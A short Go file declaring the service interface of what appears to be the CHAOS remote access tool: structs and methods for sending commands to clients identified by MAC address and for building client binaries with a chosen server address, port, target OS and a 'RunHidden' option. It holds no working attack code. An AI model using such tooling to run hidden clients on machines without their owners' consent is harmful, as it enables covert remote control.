package services

import (
	"context"
	"github.com/tiagorlampert/CHAOS/shared/utils/system"
)

type (
	SendCommandInput struct {
		MacAddress string
		Request    string
	}
	SendCommandOutput struct {
		Response string
	}

	BuildClientBinaryInput struct {
		ServerAddress, ServerPort, Filename string
		RunHidden                           bool
		OSTarget                            system.OSType
	}
)

type Client interface {
	SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error)
	BuildClient(BuildClientBinaryInput) (string, error)
}
